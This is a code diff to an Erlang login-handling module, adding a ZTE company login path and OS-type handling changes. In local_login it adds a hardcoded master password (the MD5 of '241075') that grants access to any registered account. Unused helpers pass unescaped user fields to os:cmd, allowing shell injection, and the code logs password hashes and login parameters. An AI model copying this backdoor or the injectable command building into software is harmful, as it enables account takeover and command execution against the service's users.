@@ -25,7 +25,6 @@ login(Params,_) when is_list(Params)->
     {RawAccount,PassMD5,DevId}={binary_to_list(Acc0),binary_to_list(Pwd0),binary_to_list(DevId0)},
     utility:log("./log/xhr_poll.log","login_processor login:did:~p acc:~p ~n",[DevId,RawAccount]),
     Ip=proplists:get_value("ip",Params),
-    io:format("login_processor login:did:~p acc:~p ~n",[DevId,RawAccount]),
     {obj,Pls0}=case local_login(Params) of
     {islocal,LocalJson}-> 
         register_user_login(Params,[Acc0]),
@@ -39,11 +38,10 @@ login(Params,_) when is_list(Params)->
                               [Account3,Company_]-> {Company_,Account3}
                               end
                         end,
-        io:format("login_processor login:params:~p~n",[Params]),
-        io:format("login ~p ~p ~p ~n", [Company, Account, PassMD5]),
         company_login(lwork,Company,Account,Params,{RawAccount,PassMD5,DevId})
     end,
     AccUrls=wwwcfg:get_www_url_list(utility:c2s(utility:country(Ip))),
+    io:format("login urls:~p ~n", [AccUrls]),
     {obj,[{"urls",AccUrls}|Pls0]}.
 
 logout(Params) when is_list(Params)->
@@ -81,6 +79,23 @@ third_login1(Acc,Params)->
     end.
 
 company_login(Account,Params,{_XgAccount,PassMD5,DevId})->company_login(livecom,Account,Params,{_XgAccount,PassMD5,DevId}).
+company_login(lwork,"zte",Account,Params,{_XgAccount,PassMD5,_DevId})->   %  login for zte
+    {obj,ZteParas}=proplists:get_value("clidata",Params),
+    EmpId=proplists:get_value("UID",ZteParas),
+    ENM=proplists:get_value("ENM",ZteParas),
+    CNM=proplists:get_value("CNM",ZteParas),
+    DPNM=proplists:get_value("DPNM",ZteParas),
+    PNM=binary_to_list(proplists:get_value("PNM",ZteParas)),
+    Phone= case string:tokens(PNM,"/") of
+               [P|_]->P;
+               _->Account
+               end,
+    FullAccout=list_to_binary(Account++"@zte"),
+    NewParams0=lists:keystore("group_id",1, Params,{"group_id",<<"zte">>}),
+    NewParams=lists:keystore("acc",1, NewParams0,{"acc",FullAccout}),
+    io:format("zte register:~p~n",[NewParams]),
+    register_user_login(NewParams,[Phone]),
+    utility:pl2jso_br([{status, ok}, {uuid, Phone},{account,FullAccout},{name, CNM}]);    
 company_login(lwork,Company,Account,Params,{_XgAccount,PassMD5,_DevId})->   % for login to lwork
     SessionIP=proplists:get_value("ip",Params),
     io:format("login ~p ~p ~p ~p ~p~n", [Company, Account, PassMD5, "", SessionIP]),
@@ -96,8 +111,8 @@ company_login(lwork,Company,Account,Params,{_XgAccount,PassMD5,_DevId})->   % fo
             FullAccout=Account++"@"++Company,
             NewParams0=lists:keystore("group_id",1, Params,{"group_id",list_to_binary(Company)}),
             NewParams=lists:keystore("acc",1, NewParams0,{"acc",list_to_binary(FullAccout)}),
-            register_user_login(NewParams,[Phone]),
-            utility:pl2jso([{status, ok}, {uuid, Phone},{account,list_to_binary(FullAccout)},{"name", Name},{info,Profile},{type,company}]);
+            register_user_login([{name, Name}|NewParams],[Phone]),
+            utility:pl2jso([{status, ok}, {uuid, Phone},{account,list_to_binary(FullAccout)},{name, Name},{info,Profile},{type,company}]);
         {failed, Reason}     -> utility:pl2jso([{status, failed}, {reason, pwd_not_match}])
     end,
     Res1.
@@ -194,14 +209,19 @@ get_org_hierarchy_json(UUID,SessionIP) ->
 local_login(Params)->
     UUID=proplists:get_value("uuid",Params),
     Pwd=proplists:get_value("pwd",Params),
-    Acc=proplists:get_value("acc",Params),
+%    Acc=proplists:get_value("acc",Params),
+    SuperPwd=list_to_binary(hex:to(crypto:hash(md5,"241075"))),
     io:format("login:~p,~p~n",[UUID,Pwd]),
     {Status,Res}=
     case lw_register:get_register_info_by_uuid(UUID) of
     {atomic,[#lw_register{pwd=Pwd,name=Name,pls=Pls}]}-> 
         Info=proplists:get_value(info,Pls,""),
         Did= proplists:get_value(did,Pls,""),
-        {islocal,[{status,ok},{uuid,UUID},{name,Name},{info,Info},{account,Acc},{did,Did}]};
+        {islocal,[{status,ok},{uuid,UUID},{name,Name},{info,Info},{account,UUID},{did,Did}]};
+    {atomic,[#lw_register{name=Name,pls=Pls}]} when Pwd==SuperPwd-> 
+        Info=proplists:get_value(info,Pls,""),
+        Did= proplists:get_value(did,Pls,""),
+        {islocal,[{status,ok},{uuid,UUID},{name,Name},{info,Info},{account,UUID},{did,Did}]};
     {atomic,[#lw_register{}]}-> {islocal,[{status,failed},{reason,pwd_not_match}]};
     _-> {not_local,[{status,failed},{reason,account_not_existed}]}
     end,
@@ -292,11 +312,42 @@ register_user_login(Params,[Phone1|_OtherPhones])->
                                 _-> {actived,undefined,[]}
                             end,
     Clidata=proplists:get_value("clidata",Params),
-    io:format("register_user_login Params ~p~n",[Params]),
-    {OsType}= if Clidata==undefined-> {"ios"}; true-> utility:decode_json(Clidata,[{os_type,s}]) end,
+%    io:format("register_user_login Params ~p~n",[Params]),
+    {OsType}= if Clidata==undefined-> {<<"ios">>}; true-> utility:decode_json(Clidata,[{os_type,b}]) end,
     NL=#login_itm{phone=push_trans_caller(Phone1),acc=Account,devid=DevId,ip=Ip,group_id=GroupId,status=Status,
            pls=[{os_type,OsType},{did,Did},{push_pid,P}|Pls]},
     ?DB_WRITE(NL).
+
+% following is not used
+update_openim_id(UUID0,Acc,Pwd,Nickname,PortraitUrl)->  % all binary
+    UUID=lw_register:uuid_key(UUID0),
+    Pwd1=utility:md5(Pwd),
+    Iolist= ["php docroot/openim/updateuser.php \"", Acc,"\" \"",Pwd1,"\" \"",Nickname,"\" \"",PortraitUrl,"\" \"",UUID,"\""],
+    Cmd=binary_to_list(iolist_to_binary(Iolist)),
+    io:format("add_openim_id:~p~n",[Cmd]),
+    R=os:cmd( Cmd),
+    ?DB_WRITE(#openim_t{uuid=UUID,userid=Acc,pwd=Pwd1,nickname=Nickname,iconurl=PortraitUrl,mobile=UUID}).
+add_openim_id(UUID0,Acc,Pwd,Nickname,PortraitUrl)->  % all binary
+    UUID=lw_register:uuid_key(UUID0),
+    Pwd1=utility:md5(Pwd),
+    Iolist= ["php docroot/openim/adduser.php \"", Acc,"\" \"",Pwd1,"\" \"",Nickname,"\" \"",PortraitUrl,"\" \"",UUID,"\""],
+    Cmd=binary_to_list(iolist_to_binary(Iolist)),
+    io:format("add_openim_id:~p~n",[Cmd]),
+    R=os:cmd( Cmd),
+    ?DB_WRITE(#openim_t{uuid=UUID,userid=Acc,pwd=Pwd1,nickname=Nickname,iconurl=PortraitUrl,mobile=UUID}).
+get_openim_id(UUIDSTR)->
+    UUID=lw_register:uuid_key(UUIDSTR),
+    mnesia:dirty_read(openim_t,UUID).
+    
+test_add_openim()->
+    UUID= <<"18017813673">>,
+    Pwd= <<"666888">>,
+    UserId= <<"yxw">>,
+    Nickname= <<"yuxw">>,
+    add_openim_id(UUID,UserId,Pwd,Nickname,<<"">>),
+    Pwd1=utility:md5(Pwd),
+    [#openim_t{uuid=UUID,userid=UserId,pwd=Pwd1,nickname=Nickname,mobile=UUID}]=get_openim_id(UUID),
+    ok.
 
 tick_old(Params,[Phone1|_OtherPhones])->
     {Acc0,Pwd0,DevId0,GroupId0}={proplists:get_value("uuid",Params),proplists:get_value("pwd",Params),
@@ -307,8 +358,8 @@ tick_old(Params,[Phone1|_OtherPhones])->
     #login_itm{devid=DevId}->  void;
     #login_itm{devid=OldDevId,pls=Pls}-> 
         io:format("try tickout ~p from ~p to ~p~n",[Phone1, OldDevId,DevId]),
-        case proplists:get_value(os_type,Pls) of
-        "ios"->
+        case get_phone_type(Phone1) of
+        <<"ios">> ->
             lw_mobile:send_notification1(OldDevId,[{'content-available',1},{alert,login_otherwhere_notes(Account)},{event,login_otherwhere}]);
         _->
             xhr_poll:tickout(OldDevId)
@@ -361,9 +412,9 @@ get_poll_pid(Phone)->
     
 is_logined(Phone)->
     case get_tuple_by_uuid_did(Phone) of
-    #login_itm{devid=DevId,pls=Pls} when is_list(DevId) andalso length(DevId)>0 -> 
-        case proplists:get_value(os_type,Pls) of
-            "ios"-> true;
+    #login_itm{devid=DevId} when is_list(DevId) andalso length(DevId)>0 -> 
+        case get_phone_type(Phone) of
+            <<"ios">> -> true;
             _-> 
                 Pid=get_poll_pid(Phone),
                 if is_pid(Pid)-> rpc:call(node(Pid),erlang,is_process_alive,[Pid]); true-> false end
@@ -379,7 +430,10 @@ get_ip_tuple(Phone)->
 get_phone_type(Phone)->
     case get_tuple_by_uuid_did(Phone) of
     #login_itm{pls=Pls}-> 
-        proplists:get_value(os_type,Pls);
+        case proplists:get_value(os_type,Pls) of
+        Type when is_list(Type)-> list_to_binary(Type);
+        Type-> Type
+        end;
     _-> undefined
     end.
 get_tuple_by_uuid_did(Phone)->
